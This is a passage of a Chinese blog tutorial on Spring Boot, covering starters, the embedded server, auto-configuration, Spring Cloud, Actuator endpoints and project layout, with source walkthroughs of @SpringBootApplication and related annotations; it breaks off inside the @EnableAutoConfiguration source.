<p>通过这个例子，我们可以看到Spring Boot的起步依赖功能。它预先配置了常见的技术栈，如数据访问、安全认证、Web开发等，开发人员只需引入相应的起步依赖，即可快速集成这些技术，减少了开发时间和工作量。同时，Spring Boot还提供了自定义起步依赖的能力，开发人员可以根据自己的需求创建自己的起步依赖，进一步提高开发效率。</p>
<h2 id="内嵌服务器"><a href="#内嵌服务器" class="headerlink" title="内嵌服务器"></a>内嵌服务器</h2><p>Spring Boot内置了一些常用的服务器，如Tomcat、Jetty等，使得应用程序可以直接运行而无需部署到外部服务器上。这样可以简化部署过程，减少了对服务器的依赖。</p>
<p>假设我们有一个简单的Spring Boot应用程序，我们想要将其部署到一个Web服务器上。在传统的部署方式中，我们需要手动安装和配置一个外部的Web服务器，如Tomcat或Jetty，并将我们的应用程序部署到该服务器上。</p>
<p>但是在使用Spring Boot时，我们可以直接使用内置的服务器来运行我们的应用程序，而无需额外的部署步骤。</p>
<p>例如，我们可以使用默认的内置Tomcat服务器来运行我们的应用程序。只需添加spring-boot-starter-web依赖，并编写一个简单的Controller类：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorldController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们只需要运行main方法启动应用程序，Spring Boot会自动检测到我们的代码，并使用内置的Tomcat服务器来运行我们的应用程序。</p>
<p>现在，我们可以通过访问<font color = red><a href="http://localhost:8080/hello">http://localhost:8080/hello</a></font>来测试我们的应用程序，它将返回”Hello, World!”作为响应。</p>
<p>通过这个例子，我们可以看到Spring Boot内置服务器的功能。它使得我们可以直接运行应用程序，而无需额外的部署步骤和对外部服务器的依赖。这样可以简化部署过程，减少了配置和管理服务器的工作量，提高了开发效率。</p>
<h2 id="自动配置"><a href="#自动配置" class="headerlink" title="自动配置"></a>自动配置</h2><p>Spring Boot通过自动配置功能，根据类路径下的依赖自动配置应用程序。它会根据项目中的依赖自动推断并配置相关的组件，减少了手动配置的工作。</p>
<p>假设我们有一个简单的Spring Boot应用程序，我们需要使用JPA进行数据持久化操作。在传统的Spring项目中，我们需要手动配置数据源、实体管理器等组件，并引入相应的依赖。</p>
<p>但是在使用Spring Boot时，我们可以通过添加spring-boot-starter-data-jpa依赖来自动配置JPA相关的组件。该依赖会自动引入所需的依赖，包括Hibernate、Spring Data JPA等，并配置数据源、实体管理器等组件。</p>
<p>例如，我们可以定义一个简单的实体类，使用JPA注解进行映射：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 省略getter和setter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后，我们可以创建一个简单的Repository接口来进行数据库操作：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    User <span class="title function_">findByUsername</span><span class="params">(String username)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，我们使用@Repository注解将该接口标记为一个Repository，并继承了JpaRepository接口，它提供了一些常用的数据库操作方法。</p>
<p>现在，我们可以在其他地方使用UserRepository进行数据库操作，而不需要手动编写SQL语句或配置数据源等。</p>
<p>通过这个例子，我们可以看到Spring Boot的自动配置功能。它会根据项目中的依赖自动推断并配置相关的组件，减少了手动配置的工作。同时，Spring Boot还支持自定义自动配置，我们可以根据需求添加或修改自动配置规则，进一步提高开发效率。</p>
<h2 id="微服务支持"><a href="#微服务支持" class="headerlink" title="微服务支持"></a>微服务支持</h2><p>Spring Boot天生支持构建微服务架构。它提供了对Spring Cloud的支持，可以方便地构建分布式系统、服务注册与发现、负载均衡等功能。</p>
<p>假设我们正在构建一个简单的微服务系统，其中包括一个用户服务和一个订单服务。用户服务负责管理用户信息，订单服务负责处理订单相关的操作。</p>
<p>首先，我们可以使用Spring Boot创建两个独立的服务项目，每个项目都是一个独立的Spring Boot应用程序。</p>
<p>在用户服务中，我们可以定义一个简单的Controller类，提供获取用户信息的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span> &#123;</span><br><span class="line">        <span class="comment">// 根据id查询用户信息</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在订单服务中，我们也可以定义一个类似的Controller类，提供处理订单的接口。</p>
<p>接下来，我们可以使用Spring Cloud的功能来实现服务注册与发现、负载均衡等。</p>
<p>首先，我们可以使用Eureka作为服务注册中心，将用户服务和订单服务注册到Eureka服务器上。只需在项目中添加<font color = red>spring-cloud-starter-netflix-eureka-client</font>依赖，并在配置文件中指定Eureka服务器的地址。</p>
<p>然后，我们可以使用Feign作为声明式的HTTP客户端，使得服务之间的调用更加简单。只需在项目中添加<font color = red>spring-cloud-starter-openfeign</font>依赖，并在需要调用其他服务的地方定义一个Feign客户端接口。</p>
<p>例如，在订单服务中，我们可以定义一个使用Feign调用用户服务的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@FeignClient(&quot;user-service&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserClient</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/users/&#123;id&#125;&quot;)</span></span><br><span class="line">    User <span class="title function_">getUser</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们可以在订单服务中使用UserClient来调用用户服务的接口，而无需手动创建HTTP请求。</p>
<p>通过这个例子，我们可以看到Spring Boot与Spring Cloud的支持。它们使得构建微服务架构变得更加简单和高效，提供了服务注册与发现、负载均衡等功能，减少了开发人员的工作量，并提高了系统的可伸缩性和弹性。</p>
<h2 id="监控和管理"><a href="#监控和管理" class="headerlink" title="监控和管理"></a>监控和管理</h2><p>Spring Boot提供了丰富的监控和管理功能，如健康检查、指标收集、远程调试等。这些功能可以帮助开发人员更好地监控和管理应用程序。</p>
<p>假设我们正在构建一个简单的Web应用程序，我们可以使用Spring Boot提供的Actuator模块来实现健康检查、指标收集、远程调试等功能。</p>
<p>首先，我们可以在项目中添加spring-boot-starter-actuator依赖，该依赖会自动添加Actuator模块到项目中。</p>
<p>然后，我们可以访问&#x2F;actuator端点来获取应用程序的各种指标信息，例如：</p>
<p>&#x2F;actuator&#x2F;health：获取应用程序的健康状态信息，包括是否存活、数据库连接状态等。<br>&#x2F;actuator&#x2F;metrics：获取应用程序的各种指标信息，例如请求处理时间、内存使用情况等。<br>&#x2F;actuator&#x2F;env：获取应用程序的环境变量信息。<br>&#x2F;actuator&#x2F;info：获取应用程序的自定义信息。<br>除了以上的端点外，Actuator还提供了其他一些有用的端点，例如：</p>
<p>&#x2F;actuator&#x2F;trace：获取最近的HTTP请求和响应信息。<br>&#x2F;actuator&#x2F;loggers：查看和修改日志级别。<br>&#x2F;actuator&#x2F;threaddump：获取线程转储信息。<br>此外，Actuator还支持自定义端点，我们可以根据需求添加自定义的端点，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Endpoint(id = &quot;myendpoint&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyEndpoint</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@ReadOperation</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">myEndpoint</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，我们定义了一个自定义端点&#x2F;actuator&#x2F;myendpoint，返回一个简单的字符串。</p>
<p>通过这个例子，我们可以看到Spring Boot的监控和管理功能。它们可以帮助开发人员更好地监控和管理应用程序，提供了健康检查、指标收集、远程调试等功能，并支持自定义端点，方便开发人员根据需求添加自定义的监控和管理功能。</p>
<h2 id="生态系统支持"><a href="#生态系统支持" class="headerlink" title="生态系统支持"></a>生态系统支持</h2><p>Spring Boot是Spring Framework的一部分，可以充分利用Spring生态系统中的各种组件和工具。开发人员可以使用Spring的其他模块，如Spring MVC、Spring Data等，与Spring Boot无缝集成。</p>
<p>假设我们正在构建一个Web应用程序，并使用Spring Boot作为基础框架。我们可以使用Spring MVC来处理HTTP请求和响应。</p>
<p>首先，我们可以在项目中添加spring-boot-starter-web依赖，该依赖会自动添加Spring MVC相关的依赖到项目中。</p>
<p>然后，我们可以定义一个简单的Controller类，处理HTTP请求和返回响应：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloController</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@GetMapping(&quot;/hello&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, Spring Boot!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上述代码中，我们使用了Spring MVC的注解@RestController和@GetMapping来定义一个处理GET请求的接口。</p>
<p>此外，我们还可以使用Spring Data来简化与数据库的交互。例如，我们可以使用Spring Data JPA来操作数据库。</p>
<p>首先，我们可以在项目中添加spring-boot-starter-data-jpa依赖，该依赖会自动添加Spring Data JPA相关的依赖到项目中。</p>
<p>然后，我们可以定义一个简单的实体类和Repository接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// getters and setters</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Repository</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;User, Long&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 自定义查询方法</span></span><br><span class="line">    List&lt;User&gt; <span class="title function_">findByLastName</span><span class="params">(String lastName)</span>;</span><br></pre></td></tr></table></figure>
<p>在上述代码中，我们使用了Spring Data JPA的注解@Entity和@Repository来定义实体类和Repository接口。</p>
<p>通过这个例子，我们可以看到Spring Boot与Spring生态系统的集成。它们可以无缝集成，开发人员可以充分利用Spring生态系统中的各种组件和工具，如Spring MVC、Spring Data等，来构建功能丰富的应用程序。</p>
<h1 id="SpringBoot程序目录结构"><a href="#SpringBoot程序目录结构" class="headerlink" title="SpringBoot程序目录结构"></a>SpringBoot程序目录结构</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">springboot-hello    //项目名称</span><br><span class="line">  -.idea  //idea自动生成的缓存文件</span><br><span class="line">  -.mvn   //maven相关</span><br><span class="line">  - src</span><br><span class="line">    - main //存放代码源文件、配置文件</span><br><span class="line">      -java  //存放代码源文件</span><br><span class="line">       - com.gyd.springboothello</span><br><span class="line">         -SpringbootHelloApplication  </span><br><span class="line">      -resource //存放配置文件如xml、properties格式的</span><br><span class="line">       -application.properties</span><br><span class="line">    - <span class="built_in">test</span>  //编写单元测试用例和执行</span><br><span class="line">    - .gitignore  //配置，指定提交git时要忽略哪些格式文件</span><br><span class="line">    - HELP.md //springboot官方文档链接</span><br><span class="line">    - mvnw  //maven相关</span><br><span class="line">    - mvnw.cmd  //maven相关</span><br><span class="line">    - pom.xml  // 项目基本信息定义、依赖组件引入</span><br></pre></td></tr></table></figure>

<h1 id="自动配置原理"><a href="#自动配置原理" class="headerlink" title="自动配置原理"></a>自动配置原理</h1><p>自动配置是SpringBoot的核心，而自动配置是基于条件判断来配置Bean的。关于自动配置的源码在spring-boot-autoconfigure-x.x.x.RELEASE.jar</p>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/SpringBoot/SbAutoconfig.png" alt="自动配置基础包目录"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LzjTestApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(GatewayApp.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述启动程序中使用了注解@SpringBootApplication。 @SpringBootApplication 标注在某个类上说明这个类是 SpringBoot 的主配置类，SpringBoot 通过运行这个类的 main 方法来启动 SpringBoot 应用。我们来看看这个注解的定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@SpringBootConfiguration</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="meta">@ComponentScan(</span></span><br><span class="line"><span class="meta">    excludeFilters = &#123;@Filter(</span></span><br><span class="line"><span class="meta">    type = FilterType.CUSTOM,</span></span><br><span class="line"><span class="meta">    classes = &#123;TypeExcludeFilter.class&#125;</span></span><br><span class="line"><span class="meta">), @Filter(</span></span><br><span class="line"><span class="meta">    type = FilterType.CUSTOM,</span></span><br><span class="line"><span class="meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span></span><br><span class="line"><span class="meta">)&#125;</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootApplication &#123;</span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = EnableAutoConfiguration.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    Class&lt;?&gt;[] exclude() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = EnableAutoConfiguration.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    String[] excludeName() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = ComponentScan.class,</span></span><br><span class="line"><span class="meta">        attribute = &quot;basePackages&quot;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    String[] scanBasePackages() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = ComponentScan.class,</span></span><br><span class="line"><span class="meta">        attribute = &quot;basePackageClasses&quot;</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    Class&lt;?&gt;[] scanBasePackageClasses() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = Configuration.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">proxyBeanMethods</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从定义可以看出@SpringBootApplication是一个组合注解，主要组合了@Inherited、@SpringBootConfiguration、@ComponentScan、@EnableAutoConfiguration这几个注解。下面我们针对每个注解展开了解一下</p>
<h2 id="Inherited"><a href="#Inherited" class="headerlink" title="@Inherited"></a>@Inherited</h2><p>@Inherited 元注解是一个标记注解，@Inherited阐述了某个被标注的类型是被继承的。 如果一个使用了@Inherited修饰的annotation类型被用于一个class，则这个annotation将被用于该class的子类。@Inherited annotation类型是被标注过的class的子类所继承。类并不从它所实现的接口继承annotation，方法也并不从它所重载的方法继承annotation。</p>
<blockquote>
<p>举个例子来理解这句话</p>
</blockquote>
<p>定义两个注解：@IsInheritedAnnotation 、@NoInherritedAnnotation，其中@IsInheritedAnnotation加了注解@Inherited</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> IsInheritedAnnotation &#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> NoInherritedAnnotation &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类继承关系中@Inherited的作用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NoInherritedAnnotation</span></span><br><span class="line"><span class="meta">@IsInheritedAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InheritedBase</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyInheritedClass</span> <span class="keyword">extends</span> <span class="title class_">InheritedBase</span>  &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试接口继承关系中@Inherited的作用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@NoInherritedAnnotation</span></span><br><span class="line"><span class="meta">@IsInheritedAnnotation</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IInheritedInterface</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IInheritedInterfaceChild</span> <span class="keyword">extends</span> <span class="title class_">IInheritedInterface</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>测试类实现接口关系中@Inherited的作用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IInheritedInterfaceClass</span> <span class="keyword">implements</span> <span class="title class_">IInheritedInterface</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单元测试用例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringbootHelloApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Test</span></span><br><span class="line">	<span class="keyword">void</span> <span class="title function_">testInherited</span><span class="params">()</span> &#123;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//类继承关系中，子类会继承父类使用的注解中被@Inherited修饰的注解</span></span><br><span class="line">			Annotation[] annotations = MyInheritedClass.class.getAnnotations();</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).anyMatch(l -&gt; l.annotationType().equals(IsInheritedAnnotation.class)));</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).noneMatch(l -&gt; l.annotationType().equals(NoInherritedAnnotation.class)));</span><br><span class="line">		&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//类实现接口时不会继承任何接口中定义的注解</span></span><br><span class="line">			Annotation[] annotations = MyInheritedClassUseInterface.class.getAnnotations();</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).noneMatch(l -&gt; l.annotationType().equals(IsInheritedAnnotation.class)));</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).noneMatch(l -&gt; l.annotationType().equals(NoInherritedAnnotation.class)));</span><br><span class="line">		&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//接口定义注解时，可以通过接口获取注解信息</span></span><br><span class="line">			Annotation[] annotations = IInheritedInterface.class.getAnnotations();</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).anyMatch(l -&gt; l.annotationType().equals(IsInheritedAnnotation.class)));</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).anyMatch(l -&gt; l.annotationType().equals(NoInherritedAnnotation.class)));</span><br><span class="line">		&#125;</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//接口继承关系中，子接口不会继承父接口中的任何注解，不管父接口中使用的注解有没有被@Inherited修饰</span></span><br><span class="line">			Annotation[] annotations = IInheritedInterfaceChild.class.getAnnotations();</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).noneMatch(l -&gt; l.annotationType().equals(IsInheritedAnnotation.class)));</span><br><span class="line">			assertTrue(<span class="string">&quot;&quot;</span>, Arrays.stream(annotations).noneMatch(l -&gt; l.annotationType().equals(NoInherritedAnnotation.class)));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述单元测试用例执行通过，证明了以下结论：<br>1）类继承关系中@Inherited的作用类继承关系中，<br>子类会继承父类使用的注解中被@Inherited修饰的注解<br>2）接口继承关系中@Inherited的作用接口继承关系中，<br>子接口不会继承父接口中的任何注解，不管父接口中使用的注解有没有被@Inherited修饰<br>3）类实现接口关系中<br>@Inherited的作用类实现接口时不会继承任何接口中定义的注解</p>
<h2 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h2><p>@SpringBootConfiguration 里面是@Configuration，标记当前类是配置类，源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> SpringBootConfiguration &#123;</span><br><span class="line">    <span class="meta">@AliasFor(</span></span><br><span class="line"><span class="meta">        annotation = Configuration.class</span></span><br><span class="line"><span class="meta">    )</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">proxyBeanMethods</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码可以看出，@SpringBootConfiguration 标注这个类是一个配置类。@SpringBootConfiguration只是@Configuration注解的派生注解，与@Configuration注解的功能一致。@Configuration 可以理解为一个Configuration就是对应的一个Spring的xml版的容器。可以认为@SpringBootConfiguration是springboot的注解，而@Configuration是spring的注解。</p>
<h2 id="ComponentScan"><a href="#ComponentScan" class="headerlink" title="@ComponentScan"></a>@ComponentScan</h2><p>@ComponentScan注解用于实现spring的注解扫描，会扫描特定包内的类上的注解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Repeatable(ComponentScans.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> ComponentScan &#123;</span><br><span class="line">    <span class="meta">@AliasFor(&quot;basePackages&quot;)</span></span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@AliasFor(&quot;value&quot;)</span></span><br><span class="line">    String[] basePackages() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] basePackageClasses() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">BeanNameGenerator</span>&gt; nameGenerator() <span class="keyword">default</span> BeanNameGenerator.class;</span><br><span class="line"></span><br><span class="line">    Class&lt;? <span class="keyword">extends</span> <span class="title class_">ScopeMetadataResolver</span>&gt; scopeResolver() <span class="keyword">default</span> AnnotationScopeMetadataResolver.class;</span><br><span class="line"></span><br><span class="line">    ScopedProxyMode <span class="title function_">scopedProxy</span><span class="params">()</span> <span class="keyword">default</span> ScopedProxyMode.DEFAULT;</span><br><span class="line"></span><br><span class="line">    String <span class="title function_">resourcePattern</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;**/*.class&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">useDefaultFilters</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    Filter[] includeFilters() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    Filter[] excludeFilters() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">lazyInit</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line">    <span class="meta">@Target(&#123;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@interface</span> Filter &#123;</span><br><span class="line">        FilterType <span class="title function_">type</span><span class="params">()</span> <span class="keyword">default</span> FilterType.ANNOTATION;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@AliasFor(&quot;classes&quot;)</span></span><br><span class="line">        Class&lt;?&gt;[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@AliasFor(&quot;value&quot;)</span></span><br><span class="line">        Class&lt;?&gt;[] classes() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">        String[] pattern() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h2><p>真神降临,该注解是SpringBoot自动装配的核心注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Target(&#123;ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Inherited</span></span><br><span class="line"><span class="meta">@AutoConfigurationPackage</span></span><br><span class="line"><span class="meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> EnableAutoConfiguration &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ENABLED_OVERRIDE_PROPERTY</span> <span class="operator">=</span> <span class="string">&quot;spring.boot.enableautoconfiguration&quot;</span>;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt;[] exclude() <span 